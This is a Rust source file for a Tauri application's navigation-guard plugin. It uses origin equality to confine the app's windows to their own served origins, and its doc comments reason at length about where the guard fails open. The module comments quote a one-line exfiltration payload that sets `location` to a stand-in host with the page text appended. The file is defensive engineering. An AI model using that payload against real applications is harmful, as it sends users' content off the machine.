//! The one place that decides which URL either window is allowed to *become*
//! (SEC-02, ADR-0042 finding 1, NFR-13).
//!
//! **What was wrong, stated as the runtime actually behaves.** Neither window
//! set a navigation handler, so nothing refused anything: `location =
//! 'https://x/?' + document.body.innerText` sent the slide text off the machine
//! *and* moved the projector surface to a remote page, from an application that
//! contains no networking code at all. CSP does not help and the reason is
//! specific: no directive governs top-level navigation — `navigate-to` was
//! never implemented in Chromium, and `form-action 'none'` only closes form
//! submission.
//!
//! **A correction to ADR-0042's mechanism, recorded because the conclusion was
//! right and the mechanism was not.** The ADR says
//! `pending.navigation_handler` is `None` and that
//! `tauri-runtime-wry-2.11.4/src/lib.rs:4899-4906` therefore never calls
//! `with_navigation_handler`. The second half is not what happens.
//! `tauri` 2.11.5 `manager/webview.rs:577-604` *unconditionally* replaces
//! `pending.navigation_handler` with a wrapper of its own, so
//! `with_navigation_handler` is always installed. What was `None` is the
//! *inner* handler — the one a `WebviewBuilder::on_navigation` would set
//! (`webview/mod.rs:353`/`:432`) — and the wrapper's remaining behaviour is to
//! ask the plugin store (`plugin.rs:952-962`), which with no plugin registered
//! answers `true` for every URL. Same outcome, different lever: the lever this
//! module pulls is the plugin hook, not the builder.
//!
//! **Why a plugin and not `WebviewWindowBuilder::on_navigation`.** The two
//! windows are born in two places — `main` from `tauri.conf.json`, `output`
//! from [`crate::services::display`] — and only one of those is a builder this
//! crate holds. A window declared in the configuration is created by `tauri`
//! itself (`app.rs:2524`, inside `fn setup`), which never consults this code.
//! A plugin's `on_navigation` hook is consulted from the wrapper cited above,
//! which is installed on *every* pending webview, so one registration covers
//! both windows and every window a later item adds — and the two cannot drift
//! apart, because there is only one of them. The store is read at navigation
//! time rather than captured at creation time (`manager/webview.rs:595`), so
//! registration order versus window creation does not matter either.
//!
//! **Where this code lives, and why it is not in `aeroworship_core`.** PRD §6.1
//! asks that correctness-critical logic "lives in Rust, is unit-tested, and is
//! shared by both windows"; all three hold here, and none of them says
//! `aeroworship-core`. The reason it is not moved there is **NFR-16**, not
//! ADR-0008: `tauri::Url` *is* `pub use url::Url` (`tauri/src/lib.rs:83`), so
//! core could take a `&url::Url` without ever naming `tauri` — but it would
//! then declare `url` as a direct dependency of its own, and one new direct
//! dependency for one predicate is not a trade this repository makes. The
//! predicate is `pub` so `src-tauri/tests/` can assert it without a webview,
//! which is the part §6.1 actually asks for.
//!
//! # Three places this guard is not consulted, all failing OPEN
//!
//! Named as a set, and left open-ended on purpose: a closed enumeration has
//! been wrong repeatedly in this repository, and the missing entry was always
//! the one nobody had looked for.
//!
//! 1. **The first navigation of every window never reaches this predicate.**
//!    On Windows the handler is wired to WebView2's `NavigationStarting` and
//!    cancels with `SetCancel(!allow)` (`wry` 0.55.1
//!    `src/webview2/mod.rs:673-693`), and `attach_handlers` runs at
//!    `init_webview` line 466, before the single `Navigate()` at line 531 — so
//!    *wry's* handler is installed in time. That is all those line numbers
//!    prove. Tauri's wrapper then looks the webview up by label
//!    (`manager/webview.rs:595`) and returns **`true`** when the label is
//!    absent (`:602-603`); the map is filled by `attach_webview` (`:627-632`),
//!    which `webview/mod.rs:796-804` calls only *after* the runtime has
//!    returned the webview — that is, after `Navigate()`. The same map is
//!    emptied by `on_window_close` (`manager/mod.rs:653-660`) and
//!    `on_webview_close` (`:663-665`), so there is a second such gap while a
//!    window is closing. Both fail open. Today the only navigation inside them
//!    is tauri's own `Navigate()` to the app URL, so nothing is lost — but
//!    "this predicate sees every navigation" is a claim this module cannot
//!    make, and does not.
//! 2. **A URI string `Url::parse` rejects is allowed without being offered
//!    here.** The wry adaptor parses and falls back to permit
//!    (`tauri-runtime-wry` `lib.rs:4899-4906`, `.unwrap_or(true)`). WebView2's
//!    `args.Uri()` is documented absolute, so the set is believed empty; it is
//!    not empty *by construction*, and this file cannot make it so.
//! 3. **`window.open` and `target="_blank"` do not travel through this hook** —
//!    they raise `NewWindowRequested`. They happen to be refused already:
//!    `tauri` sets no `new_window_handler` (`webview/mod.rs:354`/`:433`), and
//!    wry's `else` branch for that case is `args.SetHandled(true)` with no
//!    window created (`src/webview2/mod.rs:781-783`), which drops the request.
//!    Verified rather than assumed, because it is the obvious sibling hole —
//!    but it is refused by wry, not by this module, so a wry that changes its
//!    default changes this answer.
//!
//! Sub-frame navigation raises `FrameNavigationStarting`, which nothing here
//! subscribes to; `frame-src 'none'` in the shipped CSP is what closes it.

use tauri::plugin::{Builder as PluginBuilder, TauriPlugin};
use tauri::utils::config::{Config, FrontendDist};
use tauri::{Manager, Runtime, Url};

/// The plugin's name.
///
/// It is not one of `tauri`'s reserved names (`plugin.rs:190` — `core` and
/// `tauri`), and it names no commands, so it widens no IPC surface: a
/// `plugin:aeroworship-navigation-guard|…` invoke is refused by the ACL gate
/// before `extend_api` is reached (`webview/mod.rs:1823-1852` — the same
/// address `capabilities/main-window.json`, `capabilities/output-window.json`
/// and ADR-0052 already use for that gate), and the plugin builder's default
/// invoke handler would refuse it after (`plugin.rs:285`).
///
/// It is also the string a test passes to `AppHandle::remove_plugin`
/// (`app.rs:569`) to prove that a harness really registered this guard rather
/// than merely compiling it.
pub const PLUGIN_NAME: &str = "aeroworship-navigation-guard";

/// The navigation guard, ready to hand to `tauri::Builder::plugin`.
///
/// Registered exactly once, in [`crate::run`]. Everything it decides is in
/// [`is_internal`] and [`app_origins`], both of which are pure and public so
/// that they can be asserted without a webview.
pub fn guard<R: Runtime>() -> TauriPlugin<R> {
    PluginBuilder::new(PLUGIN_NAME)
        .on_navigation(|webview, url| {
            // `Webview: Manager` (`webview/mod.rs:2293`), so the shipped
            // configuration is read from the window that is navigating rather
            // than captured at start-up. The label goes with it because the
            // served origin is a per-webview property, not an application-wide
            // one — see `app_origins`. Navigations are rare enough that
            // rebuilding the small list per event costs nothing, and it removes
            // a cached copy that could go stale against the config.
            let allowed = app_origins(webview.config(), webview.label());
            if is_internal(url, &allowed) {
                return true;
            }
            report_refusal(webview.label(), url, &allowed);
            false
        })
        .build()
}

/// Whether `url` is one this application serves to itself.
///
/// The rule is origin equality — scheme, host and port — against the origins
/// this build actually loads its own documents from, and nothing else. It is an
/// allow-list: a URL that matches no entry is refused, so a scheme nobody
/// thought about is refused by default rather than admitted by default.
///
/// **Why the comparison is spelled out instead of using `Url::origin`.**
/// `url`'s `Origin` is *opaque* for every non-special scheme, and an opaque
/// origin is not equal even to itself. On platforms where the application's own
/// base URL is `tauri://localhost` — a non-special scheme — `a.origin() ==
/// b.origin()` would be `false` for the app's own URL, which is precisely the
/// failure that blanks a window. That is measured rather than reasoned: see the
/// `assert_ne!` in `src-tauri/tests/navigation_guard.rs`.
///
/// **Cases this decides, named because the item asked for each by name.**
///
/// - `about:blank` — **refused**. It is not an origin this app serves. It
///   cannot leave the machine, but it does paint an empty projector in front of
///   a congregation, which PM-5 counts. It is not on any start-up path either:
///   WebView2's pre-existing `about:blank` document is not a navigation, and
///   the one `Navigate()` wry issues is to the app URL (see the module docs).
/// - `data:` and `blob:` — **refused**. Neither has a host, so neither can
///   match an entry; `blob:http://tauri.localhost/…` parses with scheme `blob`
///   and no host and is refused for that reason, not by accident of the host
///   comparison. If a later item genuinely needs to navigate to a blob it has
///   to widen this deliberately.
/// - `javascript:` — **refused** here, though the refusal is theoretical:
///   WebView2 does not raise `NavigationStarting` for a `javascript:` URI, so
///   what actually stops it is `script-src 'self'` in the shipped CSP.
/// - `file:` and every other scheme — **refused**, by the same allow-list.
/// - the Vite dev server — see [`app_origins`], which is where the two build
///   profiles part company.
///
/// A candidate with no host at all can never match, even if a malformed entry
/// with no host were ever to reach `allowed`. That guard is not decoration and
/// a test now holds it to the promise: with a hostless entry in the list,
/// `about:blank` matches on all three of scheme, `None == None` host and
/// `None == None` port, so without the guard that scheme would be admitted.
pub fn is_internal(url: &Url, allowed: &[Url]) -> bool {
    url.host().is_some() && allowed.iter().any(|origin| same_origin(url, origin))
}

/// The origins the webview labelled `label` is served its own documents from.
///
/// **The URL a window actually loads is decided in `prepare_webview`**
/// (`tauri` `manager/webview.rs:443-475`), which takes `get_app_url`
/// (`manager/mod.rs:352-367`) and may rewrite it to `tauri://localhost` when
/// `PROXY_DEV_SERVER && is_local_network_url(..)`. That clause is inert here:
/// `PROXY_DEV_SERVER` is `cfg!(all(dev, mobile))` (`manager/webview.rs:43`),
/// false on every desktop build. So this list mirrors `get_app_url`: in dev the
/// base URL is `build.devUrl`, in release it is `build.frontendDist` when that
/// is a URL, and otherwise the platform's tauri-protocol URL. `tauri::is_dev()`
/// (`lib.rs:308`) is the same predicate `tauri`'s `#[cfg(dev)]` is compiled
/// from — `tauri`'s build script derives `cargo:dev` from `!custom-protocol`
/// (`tauri` `build.rs:256-261`) and `tauri_build::is_dev` reads that variable
/// back (`tauri-build` `lib.rs:425-429`) — so the two branches cannot disagree.
///
/// **The two profiles have different origins, and getting that backwards kills
/// one of them.** Under `cargo tauri dev` the windows load from
/// `http://localhost:1420`; a release bundle loads from
/// `http://tauri.localhost`. Admitting the dev server in a release build would
/// be the more expensive mistake by far — `src/lib.rs` already spells out why a
/// release binary pointed at `http://localhost:1420` is a security defect, and
/// it is a local socket any process may occupy — so the dev origin is admitted
/// **only** when `is_dev()`, and never by a shipped binary.
///
/// **The tauri-protocol origin is admitted in both profiles**, which is wider
/// than `get_app_url` for a dev build. That is deliberate, and the argument
/// rests on that origin being *served* rather than fetched: tauri registers the
/// `tauri` uri-scheme protocol unconditionally (`manager/webview.rs:267-277`),
/// wry turns it into an `AddWebResourceRequestedFilter` entry, and a request to
/// it is answered inside WebView2 without a socket being opened. Admitting it
/// therefore grants an attacker nothing, whereas omitting it would make the
/// predicate depend on a build profile for its correctness. That argument holds
/// for the **served spelling only**, which is the whole of the next paragraph.
///
/// **Exactly one spelling is served, and which one is a per-webview property.**
/// wry computes `let http_or_https = if pl_attrs.use_https { "https" } else
/// { "http" };` (`wry` `webview2/mod.rs:472`) and registers the resource filter
/// for **that spelling alone** (`:930-948`); tauri feeds the same flag into
/// `get_app_url` (`manager/webview.rs:445`, `:463`). The *other* spelling is
/// therefore not intercepted at all: it falls through to the network stack,
/// resolves `tauri.localhost` to loopback, is refused on a port nothing listens
/// on, and the projector becomes a Chromium error page — a PM-5 failure
/// produced by the very predicate that exists to prevent it. Admitting both
/// spellings would mean admitting exactly one externally reachable URL in an
/// otherwise closed allow-list, and it would apply "no other process can occupy
/// it" to a spelling for which it is false — the same argument this file uses
/// against the dev server in a release build, applied to one entry and not the
/// other. So this returns one spelling.
///
/// **How the per-webview flag is obtained, and what that costs.**
/// `Webview::use_https_scheme` is `pub(crate)` (`webview/mod.rs:1389-1391`), so
/// the effective value cannot be read from the hook; what can be read is the
/// configuration that produces it. For a window declared in `tauri.conf.json`
/// that is `app.windows[].useHttpsScheme` (`tauri-utils` `config.rs:2163`,
/// default `false` at `:2344`), and it is read here — so turning it on for a
/// declared window cannot silently blank that window. For a window built in
/// code there is no config entry, and the fallback is the same documented
/// default, `false`. That fallback is a claim about
/// [`crate::services::display`], which never calls
/// `WebviewBuilder::use_https_scheme`; the obligation is written at that
/// builder as well as here, because a claim recorded only where it is *relied
/// on* is a claim the person who breaks it never reads. Were it broken anyway,
/// the failure is that the window's own pages stop matching — the closed
/// direction — and residual 1 in the module docs means its *first* load would
/// still succeed.
///
/// **What was rejected.** Reading the origin off the webview itself
/// (`Webview::url()`) would need no configuration at all and would be exactly
/// right for a window that has only ever loaded its own page. It is not used,
/// because it is self-reinforcing in the wrong direction: any navigation that
/// ever gets through — residual 1 or 2 above — becomes the origin this
/// predicate defends from then on.
pub fn app_origins(config: &Config, label: &str) -> Vec<Url> {
    let mut origins = vec![tauri_protocol_origin(uses_https_scheme(config, label))];

    let configured = if tauri::is_dev() {
        config.build.dev_url.clone()
    } else {
        match config.build.frontend_dist.as_ref() {
            Some(FrontendDist::Url(url)) => Some(url.clone()),
            _ => None,
        }
    };
    if let Some(url) = configured {
        origins.push(url);
    }

    origins
}

/// Whether the webview labelled `label` is served over
/// `https://<scheme>.localhost` rather than `http://<scheme>.localhost`.
///
/// See [`app_origins`] for why this is read from the configuration rather than
/// from the webview, and for what the fallback asserts.
fn uses_https_scheme(config: &Config, label: &str) -> bool {
    config
        .app
        .windows
        .iter()
        .find(|window| window.label == label)
        .map(|window| window.use_https_scheme)
        .unwrap_or(false)
}

/// The URL `tauri` serves the embedded assets from on this platform.
///
/// `AppManager::tauri_protocol_url` (`manager/mod.rs:336-345`) branches on
/// Windows-or-Android versus everything else, because WebView2 and the Android
/// webview only support the custom protocol through a `*.localhost` workaround.
/// The branch is mirrored here, `cfg!` for `cfg!`, so that a reader comparing
/// the two files is comparing the same shape.
///
/// **Only the Windows arm ships (NFR-17), and nobody has ever run the other.**
/// Two of its properties are named here rather than discovered later, because
/// `tauri://localhost` is a non-special scheme and `url` treats those
/// differently from `http`: its host is **not** lower-cased, so
/// `TAURI://LOCALHOST/x` would be refused; and it has no known default port, so
/// `tauri://localhost:80` would be refused against `tauri://localhost`. Neither
/// is a defect today — tauri navigates to exactly the lower-case, port-less
/// spelling this function returns — but neither is a property the Windows arm
/// has, so "mirror" describes the shape and not the behaviour.
fn tauri_protocol_origin(https: bool) -> Url {
    // `expect` on a literal that is parsed in `tauri` itself with `unwrap`: if
    // these stop parsing, the runtime is already broken in the same way.
    let spelling = if cfg!(any(windows, target_os = "android")) {
        if https {
            "https://tauri.localhost"
        } else {
            "http://tauri.localhost"
        }
    } else {
        "tauri://localhost"
    };
    Url::parse(spelling).expect("a literal base URL should parse")
}

/// Origin equality: scheme, host, port. Userinfo, path, query and fragment are
/// not part of an origin and are not consulted, so `http://x@tauri.localhost`
/// matches and `http://tauri.localhost.example.com` does not.
///
/// `port_or_known_default` is what an origin comparison means, and it is here
/// for that reason and no other. It is **not** what makes `http://tauri.localhost`
/// and `http://tauri.localhost:80` compare equal: `url` has already dropped the
/// default port at parse time, so plain `port` would answer identically for
/// every URL either side of this function can hold. Measured rather than
/// assumed — 480 candidate/entry pairs, zero divergence
/// (`src-tauri/tests/navigation_guard.rs`), which is also why no test can kill
/// that mutation. Do not read this line as covering a case; it records a
/// definition.
fn same_origin(candidate: &Url, origin: &Url) -> bool {
    candidate.scheme() == origin.scheme()
        && candidate.host() == origin.host()
        && candidate.port_or_known_default() == origin.port_or_known_default()
}

/// Leaves a trace of a refusal, on stderr.
///
/// **Why stderr and not something better.** There is no logging facility in
/// this repository yet — NFR-34 owns that — and
/// [`crate::services::display::init`] already states, in the same words, that
/// inventing one inside another item is a second item's decision taken quietly.
/// So this follows the precedent that exists instead of adding a mechanism.
/// The consequence has to be said plainly: `main.rs` sets
/// `windows_subsystem = "windows"` for release builds, so **a shipped binary
/// has no console and this line goes nowhere**. A refusal in front of a
/// congregation is therefore invisible until NFR-34 lands. That is a real hole,
/// and it is stated rather than papered over; what is not acceptable is a
/// security refusal with no trace *anywhere*, and in a debug build there is one.
///
/// **One line and one `join` allocation per refused event, unbounded.** A
/// script that sets `location` in a loop produces one of each per iteration, on
/// the UI thread. A release build has no console to receive them; a dev build
/// gets a flooded terminal. No rate limiter is built here on purpose: a limiter
/// is a logging-policy decision, and the item that gives this repository a log
/// is the item that should take it. Named so NFR-34 inherits a requirement
/// rather than a surprise.
///
/// **Why the URL is not printed whole.** The attack this guards against is
/// `location = 'https://x/?' + document.body.innerText` — the query string *is*
/// the lyric or scripture text. Printing it would copy worship content into a
/// log, which is the one thing NFR-34 says logs must not contain. Only the
/// origin is printed. The residual is named: a host name can itself encode
/// content (`<base32>.example.com`), so this line is "no content by
/// construction" only for the query and path, and a diagnostic without the host
/// would not tell an investigator where the window was being sent, which is the
/// entire value of the line.
fn report_refusal(label: &str, url: &Url, allowed: &[Url]) {
    let allowed = allowed.iter().map(origin_of).collect::<Vec<_>>().join(", ");
    eprintln!(
        "SEC-02: refused a navigation from window `{label}` to {} (this build serves: {allowed}). \
         The path and query are deliberately omitted: they carry the slide text.",
        origin_of(url)
    );
}

/// A URL's origin as a string, for the diagnostic above and for nothing else.
///
/// The port is printed only when the URL states one, so the common case reads
/// as the origin a person would write.
fn origin_of(url: &Url) -> String {
    match (url.host_str(), url.port()) {
        (Some(host), Some(port)) => format!("{}://{host}:{port}", url.scheme()),
        (Some(host), None) => format!("{}://{host}", url.scheme()),
        (None, _) => format!("{}: (no host)", url.scheme()),
    }
}
